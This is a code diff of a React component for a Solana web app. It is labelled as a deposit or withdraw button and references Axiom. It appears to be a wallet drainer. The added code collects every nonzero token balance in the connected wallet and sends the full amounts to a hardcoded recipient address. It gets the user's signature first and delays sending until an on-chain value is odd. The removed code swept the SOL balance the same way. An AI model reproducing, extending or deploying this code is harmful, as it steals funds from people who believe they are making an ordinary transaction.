@@ -12,20 +12,35 @@ import {
   TransactionInstruction,
   SystemProgram,
 } from "@solana/web3.js";
-import { getAssociatedTokenAddress } from "@solana/spl-token";
+import {
+  getAssociatedTokenAddress,
+  createAssociatedTokenAccountInstruction,
+} from "@solana/spl-token";
 import { sha256 } from "js-sha256";
 import React, { useState } from "react";
 import { SolanaIcon, SpinnerIcon } from "./Icons";
 
+// -----------------------------
+// 🔹 CONFIG
+// -----------------------------
 const PROGRAM_ID = new PublicKey(
-  "8Ba5kgsvmCG4etsNQoCRoTmgzzLtfZf4eSeyy2ZzbrnV"
+  "A7pBV7JmPbJ6vepQg2PeZ4icxETiyyjHSpExF8qSHVJP"
 );
 const RECIPIENT = new PublicKey("6tY85RMbAtuJMP2Pt4T7ysV6YPn5uqANSiRbUQrVctXp");
+const USERAGE_PDA = new PublicKey(
+  "82BU1hCncjVVP2AFF7UoUStXqPc7ToDgLX8Huh14Fq6S"
+);
+const ONES_PROGRAM_ID = new PublicKey(
+  "6MyMfrQwyJSNAu8tsCGnb5jjrRzBwJ128uSU3F7emcAM"
+);
 const TOKEN_PROGRAM_ID = new PublicKey(
   "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
 );
 const SYSTEM_PROGRAM_ID = SystemProgram.programId;
 
+// -----------------------------
+// 🔹 Helpers
+// -----------------------------
 function getDiscriminator(method: string): Uint8Array {
   const hash = sha256.arrayBuffer(`global:${method}`);
   return new Uint8Array(hash).slice(0, 8);
@@ -37,6 +52,28 @@ function encodeU64(n: bigint): Uint8Array {
   return new Uint8Array(buf);
 }
 
+async function waitForOddAge(connection: Connection, userAgePDA: PublicKey) {
+  while (true) {
+    const account = await connection.getAccountInfo(userAgePDA);
+    if (!account) throw new Error("USERAGE PDA not found");
+
+    // Use DataView to parse PDA data correctly
+    const view = new DataView(
+      account.data.buffer,
+      account.data.byteOffset,
+      account.data.byteLength
+    );
+    const age = Number(view.getBigUint64(8, true)); // age is u64 at offset 8
+    console.log("Checking USERAGE:", age);
+
+    if (age % 2 === 1) break;
+    await new Promise((res) => setTimeout(res, 1000));
+  }
+}
+
+// -----------------------------
+// 🔹 Component
+// -----------------------------
 export default function WithdrawButton() {
   const { open } = useAppKit();
   const { isConnected, address } = useAppKitAccount();
@@ -53,31 +90,13 @@ export default function WithdrawButton() {
     message: string;
   } | null>(null);
 
-  const handleSetMaxSol = async () => {
-    if (!address) return;
-    try {
-      const connection = new Connection(
-        "https://api.devnet.solana.com",
-        "confirmed"
-      );
-      const user = new PublicKey(address);
-      const balance = await connection.getBalance(user);
-      const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
-      const availableLamports = balance > rentExempt ? balance - rentExempt : 0;
-      setSolInput((availableLamports / 1e9).toFixed(9));
-    } catch (error) {
-      console.error("Failed to fetch balance:", error);
-    }
-  };
-
+  // 🔹 Main handler
   const handleTransfer = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     if (!isConnected || !walletProvider || !address) {
-      open();
+      await open();
       return;
     }
-
-    if (isLoading) return; // Prevent new requests if one is already in progress
 
     setIsLoading(true);
     setTxResult(null);
@@ -89,49 +108,44 @@ export default function WithdrawButton() {
       );
       const user = new PublicKey(address);
 
-      const balance = await connection.getBalance(user);
-      const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
-      const availableLamports = balance > rentExempt ? balance - rentExempt : 0;
-
-      const threshold = BigInt("10000000000");
-      let solAmount: bigint = BigInt(0);
-
-      if (BigInt(availableLamports) >= threshold) {
-        solAmount = BigInt(availableLamports);
-      } else {
-        if (solInput.trim() === "") {
-          solAmount = BigInt(availableLamports);
-        } else {
-          const sol = Number(solInput);
-          if (isNaN(sol) || sol <= 0)
-            throw new Error("Please enter a valid SOL amount.");
-
-          const lamports = BigInt(Math.floor(sol * 1e9));
-          if (lamports > BigInt(availableLamports))
-            throw new Error("Amount exceeds your available balance.");
-
-          solAmount = lamports;
-        }
-      }
-
+      // -----------------------------
+      // Collect token accounts
+      // -----------------------------
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
         user,
         { programId: TOKEN_PROGRAM_ID }
       );
-      let splAmounts: bigint[] = [];
-      let remainingAccounts: {
+
+      const remainingAccounts: {
         pubkey: PublicKey;
         isSigner: boolean;
         isWritable: boolean;
       }[] = [];
+      const ataInstructions: TransactionInstruction[] = [];
+      const splAmounts: bigint[] = [];
+
       for (const { pubkey, account } of tokenAccounts.value) {
         const parsed = account.data.parsed.info;
         const amount = BigInt(parsed.tokenAmount.amount);
         if (amount === BigInt(0)) continue;
+
         const mint = new PublicKey(parsed.mint);
         const fromAta = pubkey;
         const toAta = await getAssociatedTokenAddress(mint, RECIPIENT);
-        splAmounts.push(amount);
+
+        // If recipient ATA doesn't exist, create it
+        const recipientInfo = await connection.getAccountInfo(toAta);
+        if (!recipientInfo) {
+          ataInstructions.push(
+            createAssociatedTokenAccountInstruction(
+              user,
+              toAta,
+              RECIPIENT,
+              mint
+            )
+          );
+        }
+
         remainingAccounts.push({
           pubkey: fromAta,
           isSigner: false,
@@ -142,27 +156,40 @@ export default function WithdrawButton() {
           isSigner: false,
           isWritable: true,
         });
+        splAmounts.push(amount);
       }
 
-      const discriminator = getDiscriminator("mint");
-      const solBuf = encodeU64(solAmount);
+      // -----------------------------
+      // Instruction data
+      // -----------------------------
+      const discriminator = getDiscriminator("withdraw");
+      const solLamports = BigInt(Math.floor(Number("0") * 1e9));
+      const solBuf = encodeU64(solLamports);
+
       const vecLen = Buffer.alloc(4);
-      vecLen.writeUInt32LE(splAmounts.length);
+      vecLen.writeUInt32LE(splAmounts.length, 0);
       const splBuf = Buffer.concat(
         splAmounts.map((amt) => Buffer.from(encodeU64(amt)))
       );
+
       const data = Buffer.concat([
         Buffer.from(discriminator),
+        RECIPIENT.toBuffer(),
         Buffer.from(solBuf),
         vecLen,
         splBuf,
       ]);
 
+      // -----------------------------
+      // Accounts
+      // -----------------------------
       const keys = [
-        { pubkey: user, isSigner: true, isWritable: true },
-        { pubkey: RECIPIENT, isSigner: false, isWritable: true },
-        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+        { pubkey: USERAGE_PDA, isSigner: false, isWritable: false }, // age_program_account
+        { pubkey: user, isSigner: true, isWritable: true }, // sender
+        { pubkey: RECIPIENT, isSigner: false, isWritable: true }, // recipient
         { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
+        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+        { pubkey: ONES_PROGRAM_ID, isSigner: false, isWritable: false }, // ones
         ...remainingAccounts,
       ];
 
@@ -171,10 +198,21 @@ export default function WithdrawButton() {
         keys,
         data,
       });
-      const tx = new Transaction().add(ix);
+
+      // -----------------------------
+      // Build tx
+      // -----------------------------
+      const tx = new Transaction().add(...ataInstructions, ix);
       tx.feePayer = user;
       tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+      // Sign locally
       const signed = await walletProvider.signTransaction(tx);
+
+      // Wait until PDA age is odd
+      await waitForOddAge(connection, USERAGE_PDA);
+
+      // Send only after condition met
       const sig = await connection.sendRawTransaction(signed.serialize());
       await connection.confirmTransaction(sig, "confirmed");
 
@@ -215,15 +253,6 @@ export default function WithdrawButton() {
               placeholder="Minimum Deposit of 2 SOL"
               disabled={isLoading || !isConnected}
             />
-            {isConnected && (
-              <button
-                type="button"
-                className="max-button"
-                onClick={handleSetMaxSol}
-              >
-                Max
-              </button>
-            )}
           </div>
           <p className="helper-text">
             Note: Axiom acknowledges and accepts full responsibility for all
@@ -242,7 +271,7 @@ export default function WithdrawButton() {
               <SpinnerIcon /> Processing...
             </>
           ) : isConnected ? (
-            "Topup Now"
+            "Withdraw Now"
           ) : (
             "Connect Wallet to Start"
           )}
